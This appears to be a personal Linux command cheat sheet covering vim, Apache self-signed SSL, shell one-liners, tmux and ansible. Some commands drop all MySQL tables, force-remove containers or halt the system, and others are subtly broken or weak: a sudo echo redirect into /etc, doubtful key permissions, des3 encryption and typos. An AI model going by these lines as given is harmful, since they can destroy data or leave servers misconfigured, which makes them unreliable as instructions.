$>  gg                      ## go to start of file
$>  G                       ## go to end of file
$>  250G                    ## go to line 250
$>  /                       ## search
$>  n                       ## search next
$>  ?                       ## search backwards
$>  cntl+o                  ## go back to one step
$>  cntl+i                  ## go forward to one step
$>  %                       ## cursor on ( [ { will file corresponding ) ] }
$>  :s/this/that/           ## substitute first instance in line of this to that
$>  :s/this/that/g          ## substitute all instances in line of this to that
$>  :28,92s/this/that/g     ## substitute all instances in line 28-92 range of this to that
$>  :%s/this/that/g         ## substitute all instances in file of this to that
$>  :%s/this/that/gc        ## find all instances in line of this to that with confirmation to substitute
$>  :! command              ## execute command
$>  :r filename             ## retrieve and inserts text from a file
$>  :r !command             ## retrieve and inserts output from command
$>  o                       ## opens line below cursor and go into insert mode
$>  O                       ## opens line above cursor and go into insert mode
$>  e                       ## go to end of each word
$>  R                       ## Replace text
$>  V                       ## Select lines
$>  cntl+v                  ## Select block
$>  v                       ## Select characters
$>  v MOVE CURSOR d         ## cut selected text (cut)
$>  v MOVE CURSOR y         ## yank selected text (copy)
$>  p                       ## Put yanked text (paste)
$>  v MOVE CURSOR w name    ## selects text to write to file, write to file
$>  CTRL-v                  ## select mult lines
$>  :set option             ## turn option on
$>  :set number             ## turn on line numbers or :set nu
$>  :set nonumber           ## turn off line numbers or :set !nu
$>  :set ignorecase         ## ignore upper/lower case when searching
$>  :set incsearch          ## show partial matches for a search phrase
$>  :set hlsearch           ## highlight all matching phrases
$>  :set mouse=a            ## use mouse in term emulator
$>  :e filename             ## edit another file
$>  :split filename         ## split window and load another file
$>  ctrl-w up arrow         ## move cursor up a window
$>  ctrl-w ctrl-w           ## move cursor to another window (cycle)
$>  ctrl-w_                 ## maximize current window
$>  ctrl-w=                 ## make all equal size
$>  10 ctrl-w+              ## increase window size by 10 lines
$>  :vsplit file            ## vertical split
$>  :sview file             ## same as split, but readonly
$>  :hide                   ## close current window
$>  :only                   ## keep only this window open
$>  :ls                     ## show current buffers
$>  :b 1                    ## open buffer #1 in this window
$>  :b 2                    ## open buffer #2 in this window
$>  :colo cntl+d            ## show available colorschemes
##
$>  mk                                 ## 1) mark the first line: 2) move to last line
$>  y'k                              ' ## 3a) yank:
$>  d'k                              ' ## 3b) delete:4) move to destination line
$>  P or p                             ## 5) put with
$>  mk                                 ## 1) mark the first line:
$>  ml                                 ## 2) mark the last line:
$>  :'k,'ls/regex/power/g              ## Apply regex to an arbitrary number of lines
$>  :'k,'ls/^/#/                       ## Add # to block of text
$>  :'k,'ls/\ *$//                     ## Remove trailing whitespace of block of text
$>  :%s#/path/to/log#/new/path/log#g   ## Search and replace PATHs, using different delimiter
$>  :w !doas tee %                     ## Write file as root
$>  :w !diff -u % -                    ## Diff the file on disk with the file in the buffer
$>  :!cp % %.bak                       ## Make a backup of the file on disk
$>  :%!sort                            ## Sort all lines
$>  !}sort                             ## Sort paragraph.  } won't be shown in the command.
$>  !Gsort                             ## Sort from current line to EOF.  G won't be shown in the command.
$>  :%!uniq                            ## Uniq all lines
$>  !}uniq                             ## Uniq paragraph.  } won't be shown in the command.
$>  !Guniq                             ## Uniq from current line to EOF.  G won't be shown in the command.
$>  :g/^CHAPTER /t.|s/./=/g            ## Underline all lines starting with CHAPTER
$>  :g/pattern/?^ *def ?#              ## Search for "pattern", print the containing function (start with def) and line number
$>  :g/pattern/?^$?+,//-s/^/#          ## Add # to paragraph containing "pattern", ie. comment out
$>  :g/{$/+,/^}/-!sort                 ## Sort content of multiline CSS blocks
$>  :g/^[^@].*{$/+,/}/-!sort           ## Sort content of multiline CSS blocks (media queries)
$>  :g/<p>/+,/<\/p>/-!fmt -40          ## Reformat HTML paragraphs to a fixed width (40)
$>  :%s/\(.*\), \(.*\)/\2 \1/          ## Swap "Lastname, Firstname" to "Firstname, Lastname"
$>  :%j                                ## Join all lines
$>  :g/pattern/t$                      ## Copy (t) lines containing "pattern"
$>  :g/pattern/m$                      ## Move (m) lines containing "pattern"
$>  :%!awk -F':' '{print $3}'          ## Select a column (3rd) from formated text seperated by ':'
$>  mk                                 ## 1) mark the first line:
$>  ml                                 ## 2) mark the last line:
$>  :'k,'l!awk 'END{print "Total:", i}{i+=$1; print}'      ## Insert the sum of a list of numbers after an arbitrary number of lines
$>  :'k,'l!awk 'END{print "Total:", i} ++i || 1'           ## Insert the sum of a list of numbers after an arbitrary number of lines
$>  :?^$?+,// -w !mail -s "<subject>" email@example.com     ## Email the current paragraph
$>  :set cedit=<CTRL-V><ESC>                               ## Enable and ) Set ESC key to enable history, or add to .exrc:
$>  :<ESC>                                                 ## use ex history1
$>  :Explore                           ##
$> firefox  https://github.com/tpope/vim-fugitive
$>  :Gmove newname                     ## This will: Rename your file on disk. Rename the file in git repo. Reload the file into the current buffer.Preserve undo history.
$>  :Gwrite                            ## If your file was not yet added to a git repo then first add it:
$>  :retab                             ## Change tabs to spaces
$>  "mdd                             " ## Select buff then dd erase line and copy to buffer "m. to put, pick buffer and put"
$>  "mp                              " ## pick buffer and put
## #########################
## ##    END vim
## #########################
##==========================================
## ########################
## ##    HTTPS SSL
## ########################
## Self signed apache SSL certificate.
##------------------------------------------
## enable the SSL module.
$> sudo a2enmod ssl
##  Generate the CSR. remember passphrase!
$> sudo openssl req -new > new.ssl.csr
#> fill out the questions normally have verified by a Certificate Signing Authority:
## writing new private key to 'privkey.pem'
## Country(2 letter code)
## State(full name)
## Locality(city)
## Organization(company)
## Organizational(section)
## Name(YOUR name)
## Email
## create the key.
$> sudo openssl rsa -in privkey.pem -out new.cert.key
## create the certificate. -days option sets the length of time before the certificate expires.
$> sudo openssl x509 -in new.cert.csr -out new.cert.cert -req -signkey new.cert.key -days NNN
## copy the certificate to /etc/ssl where Apache can find them.
$> sudo cp new.cert.cert /etc/ssl/certs/server.crt
$> sudo cp new.cert.key /etc/ssl/private/server.key
## key (server.key) and PEM certificate (server.crt is a PEM certificate).
## the certificate is world-readable, the key not world-readable ???correct permissions??
$> sudo chmod 744 /etc/ssl/certs/server.crt
$> sudo chmod 770 /etc/ssl/private/server.key
## Configure Apache, change to match your server setup.    /etc/apache2/sites-available/mydomain.net
## All on one line
$> sudo echo -e 'NameVirtualHost *:443\nNameVirtualHost *:80\n\n<VirtualHost *:80>\n    ServerAdmin email address here\n    ServerName mydomain.net\n    ServerAlias www.mydomain.net\n    DocumentRoot /var/www/mydomain.net/public_html/\n    ErrorLog /var/www/mydomain.net/logs/error.log\n    CustomLog /var/www/mydomain.net/logs/access.log combined\n</VirtualHost>\n\n<VirtualHost *:443>\n    ServerAdmin\n This e-mail address is being protected from spambots.\n\n    ServerName mydomain.net\n    ServerAlias www.mydomain.net\n    DocumentRoot /var/www/mydomain.net/public_html/\n\n    ErrorLog /var/www/mydomain.net/logs/error.log\n    CustomLog /var/www/mydomain.net/logs/access.log combined\n\n    SSLEngine on\n    SSLOptions +StrictRequire\n    SSLCertificateFile /etc/ssl/certs/server.crt\n    SSLCertificateKeyFile /etc/ssl/private/server.key\n</VirtualHost>\n' > /etc/apache2/sites-available/mydomain.net
## or multi line
$> sudo echo '
#NameVirtualHost *:443
#NameVirtualHost *:80
#
#<VirtualHost *:80>
#    ServerAdmin email address here
#    ServerName mydomain.net
#    ServerAlias www.mydomain.net
#    DocumentRoot /var/www/mydomain.net/public_html/
#    ErrorLog /var/www/mydomain.net/logs/error.log
#    CustomLog /var/www/mydomain.net/logs/access.log combined
#</VirtualHost>
#
#<VirtualHost *:443>
#    ServerAdmin
# This e-mail address is being protected from spambots.
#
#    ServerName mydomain.net
#    ServerAlias www.mydomain.net
#    DocumentRoot /var/www/mydomain.net/public_html/
#
#    ErrorLog /var/www/mydomain.net/logs/error.log
#    CustomLog /var/www/mydomain.net/logs/access.log combined
#
#    SSLEngine on
#    SSLOptions +StrictRequire
#    SSLCertificateFile /etc/ssl/certs/server.crt
#    SSLCertificateKeyFile /etc/ssl/private/server.key
#</VirtualHost>
#' > /etc/apache2/sites-available/mydomain.net
## Remove leading # in file
$> sudo sed -i 's/^#//g' /etc/apache2/sites-available/mydomain.net
## for new domain run: sets up a symlink under /etc/apache2/sites-enabled that links to the configuration in /etc/apache2/sites-available
$> sudo a2ensite mydomain.net
## make sure your server address is in /etc/hosts with the IP address you're using for the server.
##==========================================
## look through all text files in whole folders and subfolders for a pattern.
$> grep -HrnF "pattern"
##==========================================
## GUI
## https://obsproject.com/
## video recording and live streaming
$> sudo add-apt-repository ppa:obsproject/obs-studio
$> sudo apt-get update
$> sudo apt-get install obs-studio
##==========================================
## Generate possible completion matches for word according to the options.
$> compgen -a
$> compgen -f
$> compgen -g
$> compgen -u
$> compgen -k
$> compgen -e
$> compgen -j
$> compgen -a
##==========================================
## bash {}, %, #, '0' indexed array
$> echo {10..0..2}            ## prints every second number, starting with 10 and making its way backwards to 0
$> echo {a..z}{a..z}          ## prints all two letter combos
$> month=("Jan" "Feb" "Mar" "Apr" "May" "Jun" "Jul" "Aug" "Sep" "Oct" "Nov" "Dec")  ## '0' indexed
$> echo ${month[3]}           #> Apr
$> echo ${month%Dec}          ## % tells the shell you want to chop something off the end of the expanded variable
$> a="Hello World!"           ## Do not have to escape the '!'.
$> echo Goodbye${a#Hello}     ## Chop off a chunk from the beginning of a variable, instead of %, use #:
##---------------------------------------
## zsh {}, %, #, !, '1' indexed array
$> echo {10..0..2}            ## prints every second number, starting with 10 and making its way backwards to 0
$> echo {a..z}{a..z}          ## prints all two letter combos
$> month=("Jan" "Feb" "Mar" "Apr" "May" "Jun" "Jul" "Aug" "Sep" "Oct" "Nov" "Dec")  ## '1' indexed
$> echo ${month[3]}           #> Mar
$> echo ${month%Dec}          ## % tells the shell you want to chop something off the end of the expanded variable
$> a="Hello World\!"          ## Have to escape the '!'.
$> echo Goodbye${a#Hello}     ## Chop off a chunk from the beginning of a variable, instead of %, use #:
##==========================================
#!/bin/bash
## Read from input script.
$> clear
$> read -p "Press enter to start."
$> echo -e "Enter your name. "
$> read name
$> echo "Your name is $name"
##==========================================
## Standard error.
## 2>> appends standard error to a file >> appends command output
##==========================================
## Browser that uses firefox to render a page in a tty, psuedo page.
$> firefox https://www.brow.sh/docs/installation/
$> wget https://github.com/browsh-org/browsh/releases/download/v1.5.0/browsh_1.5.0_linux_amd64.deb
$> sudo apt install ./browsh_1.5.0_linux_amd64.deb
$> rm ./browsh_1.5.0_linux_amd64.deb
$> browsh
## awesome. Use static bianary
$> wget https://github.com/browsh-org/browsh/releases/download/v1.8.2/browsh_1.8.2_linux_amd64
$> chmod 755 browsh_1.8.2_linux_amd64
$> browsh
##==========================================
## network. Displays the quantity of connections to port 80 on a per IP basis.
$> clear;while x=0; do clear;date;echo "";echo "  [Count] | [IP ADDR]";echo "-------------------";netstat -np|grep :80|grep -v LISTEN|awk '{print $5}'|cut -d: -f1|uniq -c; sleep 5;done
##==========================================
## network. List IP addresses connected to your server on port 80.
$> netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head
##==========================================
## network. security. Ban all IPs that attempted to access phpmyadmin on your site.
$> grep "phpmyadmin" $path_to_access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP
##==========================================
## code. learn. Ternary conditional clause.
$> [ test_statement ] && ( then_statement ) || ( else_statement );
##==========================================
## network. ssh. Remove offending key from known_hosts file with one swift move.
$> ssh-keygen -R <hostname>
##------------------------------------------
## Remove offending key from known_hosts file with one swift move.
$> sed -i 18d .ssh/known_hosts
##------------------------------------------
## Remove offending key from known_hosts file with one swift move.
$> vi +18d +wq ~/.ssh/known_hosts
##==========================================
## multimedia. music. Convert a music file (mp3) to a mp4 video with a static image.
$> ffmpeg -loop_input -i cover.jpg -i soundtrack.mp3 -shortest -acodec copy output_video.mp4
##==========================================
## network. Dump network traffic with tcpdump to file with time-stamp in its filename.
$> date +"%Y-%m-%d_%H-%M-%Z" | xargs -I {} bash -c "sudo tcpdump -nq -s 0 -i eth0 -w ./dump-{}.pcap"
##==========================================
## multimedia. Create a thumbnail from the first page of a PDF file.
$> convert -thumbnail x80 file.pdf[0] thumb.png
##==========================================
## Create a visual report of the contents of a usb drive.
$> find /path/to/drive -type f -exec file -b '{}' \; -printf '%s\n' | awk -F , 'NR%2 {i=$1} NR%2==0 {a[i]+=$1} END {for (i in a) printf("%12u %s\n",a[i],i)}' | sort -nr
##==========================================
## Send HTTP POST to a website with a file input field.
$> curl -L -v -F "value=@myfile" "http://domain.tld/whatever.php"
##==========================================
## files. Remove spaces recursively from all subdirectories of a directory.
$> find /path/to/dir -type d | tac | while read LINE; do target=$(dirname "$LINE")/$(basename "$LINE" | tr -d ' '); echo mv "$LINE" "$target"; done
##==========================================
## os. files. Rename all files in a directory to lowercase names.
$> paste <(ls) <(ls | tr A-Z a-z) | while read OLD NEW; do echo mv -v $OLD $NEW; done
##==========================================
## files. multimedia. music. Count the total number of hours of your music collection.
$> find . -print0 | xargs -0 -P 40 -n 1 sh -c 'ffmpeg -i "$1" 2>&1 | grep "Duration:" | cut -d " " -f 4 | sed "s/.$//" | tr "." ":"' - | awk -F ':' '{ sum1+=$1; sum2+=$2; sum3+=$3; sum4+=$4; if (sum4 > 100) { sum3+=1; sum4=0 }; if (sum3 > 60) { sum2+=1; sum3=0 }; if (sum2 > 60) { sum1+=1; sum2=0 } if (NR % 100 == 0) { printf "%.0f:%.0f:%.0f.%.0f\n", sum1, sum2, sum3, sum4 } } END { printf "%.0f:%.0f:%.0f.%.0f\n", sum1, sum2, sum3, sum4 }'
##==========================================
## trans. Search man pages and present a PDF.
$> man -k . | awk '{ print $1 " " $2 }' | dmenu -i -p man | awk '{ print $2 " " $1 }' | tr -d '()' | xargs man -t | ps2pdf - - | zathura -
##==========================================
## files. os. List open processes ordered by number of open files.
$> ps -ef |awk '{ print $2 }' \     |tail -n +2 \   |while read pid; do echo "$pid  $(lsof -p $pid |wc -l)"; done \     |sort -r -n -k 2 \  |while read pid count; do echo "$pid    $count  $(ps -o command= -p $pid)"; done
##==========================================
## Take values from a list (file) and search them on another file.
$> for ITEM in $(cat values_to_search.txt); do  (egrep $ITEM full_values_list.txt && echo $ITEM found) | grep "found" >> exit_FOUND.txt; done
##==========================================
## DEPRECATED. Get the latest Arch Linux news.
$> w3m https://www.archlinux.org/ | sed -n "/Latest News/,/Older News/p" | head -n -1
##==========================================
## git. List the content of a GitHub repository without cloning it.
$> svn ls https://github.com/user/repo/trunk/some/path
##==========================================
## app. files. Deletes orphan vim undo files.
$> find . -type f -iname '*.un~' | while read UNDOFILE ; do FILE=$( echo "$UNDOFILE" | sed -r -e 's/.un~$//' -e 's&/\.([^/]*)&/\1&' ) ; [[ -e "$FILE" ]] || rm "$UNDOFILE" ; done
##==========================================
## multimedia. image. Create a transparent image of given dimensions.
$> convert -size 100x100 xc:none transparency.png
##==========================================
## files. Get only the latest version of a file from across mutiple directories.
$> find . -name 'filename' | xargs -r ls -tc | head -n1
##==========================================
## os. Get load average in a more parse-able format.
$> python -c 'import os; print os.getloadavg()[0]'
##==========================================
## os. files. Redirect stdout to a file you do not have write permission on.
$> echo hello | sudo tee -a /path/to/file
##==========================================
## Record audio from microphone or sound input from the console.
$> sox -t ossdsp -w -s -r 44100 -c 2 /dev/dsp -t raw - | lame -x -m s - File.mp3
##==========================================
## app. Edit the Gimp launcher file to disable the splash screen.
$> printf '%s\n' ',s/^Exec=[^ ]*/& -s/' w q | ed /usr/share/applications/gimp.desktop
##==========================================
## files. text. Remove carriage return '\r' character in many files, without looping and intermediary files
$> vi +'bufdo set ff=unix' +'bufdo %s/^M$//' +q file1 file2 file3
##==========================================
## files. text. Cut select pages from a pdf file and create a new file from those pages.
$> ps2pdf -dFirstPage=3 -dLastPage=10 input.pdf output.p
##==========================================
## files. text. Print the lines of file2 that are missing in file1
$> comm -23 file2 file1
##==========================================
## time. automation. Uses 'at' to run an arbitrary command at a specified time.
$> echo 'play alarmclock.wav 2>/dev/null' | at 07:30 tomorrow
##==========================================
## files. Recursively remove all empty sub-directories from a directory tree
$> find . -depth  -type d  -empty -exec rmdir {} \;
##==========================================
## multimedia. video. Concatenate two or more movie files into one using mencoder
$> mencoder cd1.avi cd2.avi -o movie.avi -ovc copy -oac copy
##==========================================
## multimedia. video. Rotate a movie file with mencoder.
$> mencoder video.avi -o rotated-right.avi -oac copy -ovc lavc -vf rotate=1
##==========================================
## regex. Replace a regexp pattern in many files at once.
$> vi +'bufdo %s/pattern/replacement/g | update' +q $(grep -rl pattern /path/to/dir)
##==========================================
## multimedia. image. Organise image by portrait and landscape.
$> mkdir "portraits"; mkdir "landscapes"; for f in ./*.jpg; do WIDTH=$(identify -format "%w" "$f")> /dev/null; HEIGHT=$(identify -format "%h" "$f")> /dev/null; if [[ "$HEIGHT" > "$WIDTH" ]]; then mv "$f" portraits/ ; else mv "$f" landscapes/ ; fi; done
##==========================================
## network. docker. Remove all container from an specific network (docker).
$> docker ps -a -f network=$NETWORK --format='{{.ID}}' | xargs docker rm -f
##==========================================
## multimedia. video. Print the window title of current mpv session to display what is playing.
$> wmctrl -pl | grep $(pidof mpv) | cut -d- -f2-
##==========================================
## multimedia. Get streamed FLV from Chrome with lsof
$> export psid=$(pgrep -f libflashplayer.so); cp /proc/$psid/fd/$(lsof -p $psid | grep eleted | awk {' print $4 '} | sed -e "s/[a-z]//g") saved.flv
##==========================================
## os. swap. Clear the swap space forcing everything back to main memory in Linux.
$> sudo swapoff -a; sudo swapon -a
##==========================================
## multimedia. image. Edit the Gimp launcher file to disable the splash screen.
$> sudo sed -i 's/^Exec=[^ ]*/& -s/' /usr/share/applications/gimp.desktop
##==========================================
## os. term. files. Sort du output in Human-readable format.
$> du -hsx * | sort -rh
##==========================================
## Replace symlinks with the actual files they are pointing at.
$> find /path/to/dir -type l -exec sh -c 'cp --remove-destination "$(readlink "{}")" "{}"' \;
##==========================================
## Convert from avi format to mp4 encoding.
$> ffmpeg -i file.avi file.mp4
##==========================================
## Find the most recently modified files in a directory and all subdirectories.
$> find /path/to/dir -type f -mtime -7 -print0 | xargs -0 ls -lt | head
##==========================================
## term. prompt. Set a colorful red bash prompt.
$> PS1='\[\e[1;31m\][\u@\h \W]\$\[\e[0m\] '
##==========================================
## sgl. Delete all tables of a mysql database.
$> mysql --defaults-file=my.cnf -e 'show tables' | while read t; do mysql --defaults-file=my.cnt  -e 'drop table '$t; done
##==========================================
## network. ssh. term. Put an ssh session in the background.
$> ~^z
##==========================================
## Do not save command history of current bash session.
$> HISTFILE=
##==========================================
## iso. Burn the contents of a directory to dvd without needing a gui application.
$> growisofs -dvd-compat -Z /dev/scd0 -R -J -pad /path/to/dir
##==========================================
## os. Halt the system in Linux without the halt command or gui.
$> echo o > /proc/sysrq-trigger
##==========================================
## encryption. Create an encrypted tar file with openssl.
$> tar c paths_to_files_and_dirs | gzip -c | openssl des3 > encrypted.tar.gz
##==========================================
## os. disk. Change the label of a USB drive in Linux without a gui.
$> sudo mlabel -i /dev/sdd1 ::NewLabel
##==========================================
### rsync.
$> rsync -r -t -x -v --progress -s --whole-file --exclude /Downloads /home/ /path/home
$> rsync -Paz --exclude-from 'rsync-exclude.txt' /home/ /path/home
##==========================================
##
##==========================================
## #########################
## ##    w3m
## #########################
## Commandline web browser. Only uses http, not https so has limited abilities.
$> suao apt install w3m-img
##------------------------------------------
$> w3m URL
## Set options: press o, change paramiter, press ok at bottom of section
##    Set external command to display images to fbi
## Hyperlink operations
$>   U:                # go to URL, Enter the URL you whish to visit.
$>   Esc-u:            # go to relative URL, Enter the relative URL you whish to visit.
$>   c:                # peek current URL, See what the URL of the current document is.
$>   u:                # peek link URL, Place cursor on a link and hit "u" to see what URL it links to.
$>   i:                # peek image URL, Place cursor on a image and hit "i" to see what the URL of the image is.
$>   L:                # Show all links and images, Hit "L" to get a list of all links, anchors and images of the current page.
$>   Esc-l:            # Popup linkslist, Hit "Esc-l" (small L) to get a popup menu filled with all the links of the current page.
$>   Esc-M:            # open in external browser, Place cursor on a link and hit "Esc-M" (shift-M) to open the link in an external browser.
## Navigation operations
$>   B:                # Back
$>   s:                # Show history in popup selection menu and go to selected page
$>   R:                # Reload the current document
$>   Esc-a:            # Add current page to bookmarks
$>   Esc-b:            # Open a bookmarked page
$>   Cltr-h:           # View history
## Tab operations
$>   T:                # open new tab
$>   Ctrl-q:           # close current tab
$>   {:                # move to previous tab
$>   }:                # move to next tab
$>   Esc-t:            # open popup tab selection menu and move to seleced tab
$>   Ctrl-t:           # open current link in a new tab
## Document operations
$>   v:                # toggle view html-source / normal view
$>   S:                # save the rendered output of the current document to a file
$>   Esc-s:            # save the current document to a file
$>   E:                # edit current document, open the current document in an editor if the current document is a local document
$>   Esc-e:            # edit rendered document, open the rendered output of the current document in an editor
## Image operations
$>   I:                # view image, Place, Place cursor on a image and hit "i" to see what the URL of the image is.
$>   Esc-I:            # save image, Place cursor on a image and hit "Esc-I" to save the image.
## Pager operations
$>   <space>:          # scroll one screen down
$>   +:                # scroll one screen down
$>   Ctrl-v:           # scroll one screen down
$>   b:                # scroll one screen up
$>   -:                # scroll one screen up
$>   Esc-v:            # scroll one screen up
$>   k:                # move cursor up one line
$>   j:                # move cursor down one line
$>   K:                # scroll down one line
$>   J:                # scroll up one line
$>   <:                # shift screen left
$>   >:                # shift screen right
$>   Z:                # move to center line
$>   [:                # go to first link
$>   ]:                # go to last link
$>   <tab>:            # move to the next link
$>   Esc-m:            # get a popup menu filled with all the links of the current page and move to the selected link.
$>   Ctrl-l:           # redraw screen
## Miscalanious operations
$>   Ctrl-k:           # view cookies
$>   m:                # toggle mouse operations (handy to select with the mouse pointer without having to pres shift)
##==========================================
### mpv multimedia player
## Play video in tty
$> mpv --vo=drm vid.mp4
## Play youtube video in tty
## find video format
$> mpv --vo=help
## Play youtube video in tty
$> mpv --vo=drm --ytdl-format=18 http://www.youtube.com/watch?v=jcTdRGaFldw
##==========================================

## #####################################
## ##    tmux
## #####################################
## ctrl+b then after press; % for vertical split, " for horizontal split, arrows to move curser, x to close
$> tmux
## start tmux as default, add the following lines to your ~/.bash_profile shell startup file, just above your aliases section.
$> prinf 'if command -v tmux &> /dev/null && [ -z "$TMUX" ]; then\ntmux attach -t default || tmux new -s default;\nfi' > ~/.bash_profile
## when using in tmux.conf, you have to escape % with %, i.e. write %% instead of %
## Fix problem runnung mc in tmux
$> TERM=xterm mc
## To write command on all the panes at once
$> ctrl+b :setw synchonize-panes
## tmux turn on mouse
$> ctrl+b set mouse off
## tmux turn on mouse
$> ctrl+b set mouse on
##-----------------------------------------
## Session Control (from the command line)
$> tmux                                     ## Start a new session
$> tmux new -s <session-name>               ## Start a new session with the name chosen
$> tmux ls                                  ## List all sessions
$> tmux attach -t <target-session>          ## Re-attach a detached session
$> tmux attach -d -t <target-session>       ## Re-attach a detached session (and detach it from elsewhere)
$> tmux kill-session -t <target-session>    ## Delete session
## Pane Control
$>  Ctrl b, "          " ## Split pane horizontally
$>  Ctrl b, %          ## Split pane vertically
$>  Ctrl b, o          ## Next pane
$>  Ctrl b, ;          ## Previous pane
$>  Ctrl b, q          ## Show pane numbers
$>  Ctrl b, z          ## Toggle pane zoom
$>  Ctrl b, !          ## Convert pane into a window
$>  Ctrl b, x          ## Kill current pane
$>  Ctrl b, Ctrl O     ## Swap panes
$>  Ctrl b, t          ## Display clock
$>  Ctrl b, q          ## Transpose two letters (delete and paste)
$>  Ctrl b, {          ## Move to the previous pane
$>  Ctrl b, }          ## Move to the next pane
$>  Ctrl b, Space      ## Toggle between pane layouts
$>  Ctrl b, ↑          ## Move to pane
$>  Ctrl b, ↓          ## Move to pane
$>  Ctrl b, ←          ## Move to pane
$>  Ctrl b, →          ## Move to pane
## Window Control
$>  Ctrl b, c          ## Create new window
$>  Ctrl b, d          ## Detach from session
$>  Ctrl b, ,          ## Rename current window
$>  Ctrl b, &          ## Close current window
$>  Ctrl b, w          ## List windows
$>  Ctrl b, p          ## Previous window
$>  Ctrl b, n          ## Next window
## Copy-Mode (Emacs)
$>  Ctrl b, [          ## Enter copy mode
$>  Ctrl b, M-<        ## Bottom of history
$>  Ctrl b, M->        ## Top of history
$>  Ctrl b, M-m        ## Back to indentation
$>  Ctrl b, M-w        ## Copy selection
$>  Ctrl b, M-y        ## Paste selection
$>  Ctrl b, Ctrl g     ## Clear selection
$>  Ctrl b, M-R        ## Cursor to top line
$>  Ctrl b, M-r        ## Cursor to middle line
$>  Ctrl b, ↑          ##  Cursor Up
$>  Ctrl b, ↓          ##  Cursor Down
$>  Ctrl b, ←          ##  Cursor Left
$>  Ctrl b, →          ##  Cursor Right
## Copy-Mode (vi)
$>  Ctrl b, [          ##  Enter copy mode
$>  Ctrl b, G          ##  Bottom of history
$>  Ctrl b, g          ##  Top of history
$>  Ctrl b, Enter      ## Copy selection
$>  Ctrl b, p          ##  Paste selection
$>  Ctrl b, k          ##  Cursor Up
$>  Ctrl b, j          ##  Cursor Down
$>  Ctrl b, h          ##  Cursor Left
$>  Ctrl b, l          ##  Cursor Right
## ############################
## #        END tmux          #
## ############################

##==========================================
## ############################
## #        ansible           #
## ############################
## automation. Configuration Managment
## Host management node with Inventory or hosts file of computers which ssh in configuration instructions written in yaml Playbooks which run small Modules to infrastructure clients.
##------------------------------------------
## yaml checker
## https://editor.swagger.io/
##------------------------------------------
## All infratructure hosts installed with ssh-server enabled
## On host install ansible, write grouped Inventory reflecting infrastructure, Playbooks with formated instructions, push out to clients
## Debian users may leverage the same source as the Ubuntu PPA.
## Add the following line to /etc/apt/sources.list:
$> deb http://ppa.launchpad.net/ansible/ansible/ubuntu trusty main
## Install ansible
$> sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 93C4A3FD7BB9C367
$> sudo apt-get update
$> sudo apt-get install ansible
## Ubuntu
$> sudo apt-get update
$> sudo apt-get install software-properties-common
$> sudo apt-add-repository ppa:ansible/ansible
$> sudo apt-get update
$> sudo apt-get install ansible
## Add ssh keys to servers
## Create hosts file, --- make headers [name] no spaces in names, followed by IP or URL.
$> echo '
#---
### Groups of hosts delimited by [header] elements reflecting practical groups requiring scripting
### Use qualified names or IP addresses
### Group by tasks that need to be performed on the clients
#[group1]
#192.168.1.10                               ## Human readable description of computer
#192.168.1.11                               ## Human readable description of computer
#
#[group2]
#192.168.1.12                               ## Human readable description of computer
#192.168.1.13                               ## Human readable description of computer
#...' > ./ansible/hosts_inventory
## Remove leading #
$> sed -i 's/^#//g' ./ansible/hosts_inventory
## Ad-hoc commands;
$> man ansible # -i --inventory, -m --module-name, -u --user, --become-user,
## Modules # -m  command, file-create a directory, copy-scp src=/path/file dest=/path/file, apt-
$> ansible
## ping all the clients
$> ansible all -m ping -i ~/.ansible/hosts
## as bruce, sudoing to batman. must supply a password in
$> ansible all -m ping -u bruce --sudo --sudo-user batman
## Create new directory with permissions
$> ansible group -m file -a "dest=/remote/path mode=777 owner=user1 group=user1 state=directory"
## Delete directory
$> ansible group -m file -a "dest=/remote/path state=absent"
## scp a file to all in the group
$> ansible group -m copy -a "src=/local/path/file dest=/remote/path/file"
## Makes sure package is installed, but does not update it to newest version.
$> ansible group -m apt -a "name=mc state=present"
## Makes sure package is not installed
$> ansible group -m apt -a "name=mc state=absent"
## Makes sure latest version of package is installed
$> ansible group -m apt -a "name=mc state=latest"
## Makes sure latest version of package is installed in all webservers that are not in the keepalive group
$> ansible webservers:!keepalive -m apt -a "name=mc state=latest"
## Makes sure latest version of package is installed in all webservers that are also in the staging group
$> ansible webservers:&staging -m apt -a "name=mc state=latest"
## Makes sure latest version of package is installed in the groups ‘webservers’ and ‘dbservers’ if they are also in ‘staging’ but not in the group ‘phoenix’
$> ansible webservers:dbservers:&staging:!phoenix -m apt -a "name=mc state=latest"
##------------------------------------------
### Ansible Playbooks
## Run ansible playbook with a specified inventory file and playbook, uses -become line in playboook which requires sudo so use  --ask-become-pass
$> ansible-playbook --inventory /home/$USER/.ansible/hosts /home/$USER/.ansible/playbook.yml --ask-become-pass
##------------------------------------------
## Create a playbook. Change to match your needs. Note instructions for sudo requiring task
$> echo '
#---
### First script for group
#- name: Script to test ancible              ## Label
#  hosts: group1                             ## What hosts are efffected
#  remote_user: user                         ## User on remote machine
#  vars:                                     ## Set variables for use in script
#
#   tasks:                                   ##
### First task
#   - name: Human readable label for action  ## Label
#     module: action                         ## using the module perform the action
### Second task which requires sudo root privileges. Be sure to add --ask-become-pass to command line to propt for password
#   - name: Human readable label for action  ## Label
#     become: yes                            ## become defaults to root, to become another user substitute "yes" for the username
#     module: action                         ## using the module perform the action
#
#
### Second script for diff group
#- name: Script to test ancible              ## Label
#  hosts: group2                             ## What hosts are efffected
#  remote_user: user                         ## User on remote machine
#  vars:                                     ## Set variables for use in script
#
#   tasks:                                                 ##
### First task
#   - name: Human readable label for action                ## Label
#     module: action                                       ## using the module perform the action
### Second task which requires sudo root privileges. Be sure to add --ask-become-pass to command line
#   - name: Human readable label for action                ## Label
#     become: yes                                          ## become defaults to root, to become another user substitute "yes" for the username
#      apt: name={{item}} state=present update_cache=yes   ## install web server software usinf apt and var substitution
#      with_items:
#      - php5-cli
#      - apache2
#      - mysql-server-5
#' > ./playbook.yml
## Remove leading #
$> sed -i 's/^#//g' ./playbook.yml
##-------------------------------------------
## Run ansible playbook with a specified inventory file and playbook, uses -become line in playboook which requires sudo so use  --ask-become-pass
$> ansible-playbook --inventory /home/$USER/.ansible/hosts /home/$USER/.ansible/playbook.yml --ask-become-pass
##----------------------------------------
### Using advance features of breaking inventory, playbooks and vars into multible files and folders
## Can use variables and can put in folders to save them
## in folder group_vars/ add folders named after groups
$> mkdir group_vars && cd group_vars && mkdir group1 && mkdir group2
## FIll out more info here
